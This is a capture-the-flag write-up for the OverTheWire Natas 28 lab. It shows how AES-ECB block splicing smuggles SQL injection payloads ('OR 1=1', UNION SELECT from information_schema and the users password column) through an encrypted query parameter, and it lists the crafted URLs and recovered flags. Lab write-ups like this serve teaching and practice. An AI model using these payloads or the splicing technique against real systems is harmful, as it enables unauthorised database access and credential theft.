# Natas Level 27 → Level 28 AES-ECB mode and SQL injection

## Previous Flag
<b>1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj</b>

## Goal
Username: natas28<br>
URL: http://natas28.natas.labs.overthewire.org<br>

Whack Computer Joke Database<br>
Search: <br>
sorry, we are currently out of sauce

<random result><br>
There are no shortcuts in life, unless you right click and find one...<br>
When your hammer is C++, everything begins to look like a thumb.<br>
Q: What is a computer virus?<br>
A: A terminal illness!

## What I learned (This one hard as hell)
```
AES (Advanced Encryption Standard) always uses a block size of 16 bytes (128 bits)
    ECB (Electronic Codebook) mode Block size 16 bytes (128 bits)

ECB Is Weak
    Plaintext:   [HELLO123......][HELLO123......]
    Ciphertext:  [abc123xyz....][abc123xyz....] ← same output
Use Instead
    CBC (Cipher Block Chaining) – adds randomness via an IV
    GCM (Galois/Counter Mode) – provides both encryption and integrity
    CTR (Counter Mode) – turns block cipher into stream cipher
ECB mode can make protocols without integrity protection even more susceptible to replay attacks, since each block gets decrypted in exactly the same way

Youtube Solution: https://www.youtube.com/watch?v=oWmfYgCYmCc
```

## Solution
```
Messing around with query redirect: http://natas28.natas.labs.overthewire.org/search.php/?query= ⌨️

Notice: Uninitialized string offset: -1 in 
/var/www/natas/natas28/search.php on line 59
Zero padding found instead of PKCS#7 padding

Search: AAAAAAAAA' OR 1=1 --        # Note: add 1 space at end
Browser: http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK ⌨️

https://gchq.github.io/CyberChef/ ⌨️
# URL Decode : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K

# Remove good header (G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP)
# Remove known bad block of 10 spaces (IWJ2pwLjKxd0ddiQ3a1c5l)
WY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K

Original:
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP IWJ2pwLjKxd0ddiQ3a1c5l WY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
Modified
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP ItlMM3qTizkRB5P2zYxJsb WY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
    Known good header: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
    Dummy block: ItlMM3qTizkRB5P2zYxJsb
    SQL injection: WY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
    Known good trailer: c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
URL Encode Modified: http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BKc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D

Get more results than default 3

Search: AAAAAAAAA' UNION SELECT table_name FROM information_schema.tables; -- 
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lr0T1ii%2BYsw9O0BMRL2Q9HUY%2BHp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoqRnCxfnbDr4842Rxdxh1GSGlUrqRvuT6auFhFtPS9DX%2FytyVFP8KUcB5R9dfA%2BO
URL Decode:
http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lr0T1ii+Ysw9O0BMRL2Q9HUY+Hp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoqRnCxfnbDr4842Rxdxh1GSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O ⌨️

Take out the first three blocks (header and bad block):
r0T1ii+Ysw9O0BMRL2Q9HUY+Hp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoqRnCxfnbDr4842Rxdxh1GSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O

Add header and dummy block back in and append trailer
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbr0T1ii+Ysw9O0BMRL2Q9HUY+Hp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoqRnCxfnbDr4842Rxdxh1GSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+Oc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=

URL Encode (enable encode all special characters) and put back in site base:
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbr0T1ii%2BYsw9O0BMRL2Q9HUY%2BHp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoqRnCxfnbDr4842Rxdxh1GSGlUrqRvuT6auFhFtPS9DX%2FytyVFP8KUcB5R9dfA%2BOc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D

VIEWS
VIEW_ROUTINE_USAGE
VIEW_TABLE_USAGE
jokes
users 👀
global_status
global_variables
persisted_variables
session_account_connect_attrs
session_status
session_variables
variables_info

Search: AAAAAAAAA' UNION SELECT ALL password FROM users; -- 
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5l%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
URL Decode:
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5l+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=

Remove first three blocks (header and bad block):
+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
Add header and dummy block back to the front and the trailer on the end
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
URL Encode not work smoothly so needed to:
    From Base64
    To Hex
1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 2d 94 c3 37 a9 38 b3 91 10 79 3f 6c d8 c4 9b 1b fb be 86 28 93 98 e9 a7 67 83 7f 50 50 c3 e9 ac 67 b9 5f 6b eb b0 cf 01 45 90 31 4f d0 6d f1 c9 92 05 d1 81 62 eb 46 90 4e dd c6 42 8b b8 1d 50 ac 3b 87 1c 1c 44 83 86 b4 5c d3 6d 9e 8f 72 f4 65 51 49 bb ba 21 23 d8 9d 95 41 7e a2 7f 3a 7b 73 8a 5f fb 4a 45 00 24 67 75 17 5a e5 96 bb d6 f3 4d f3 39 c6 9e dc e1 1f 66 50 bb ce d6 27 02
    From Hex
    To Base64
    URL Encode (Encode all special chars)
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOntzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D

Put back in base query
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOntzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D ⌨️

31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns 🔐
```

## Flag
<b>31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns</b>

## Continue
[Continue](./Natas2829.md)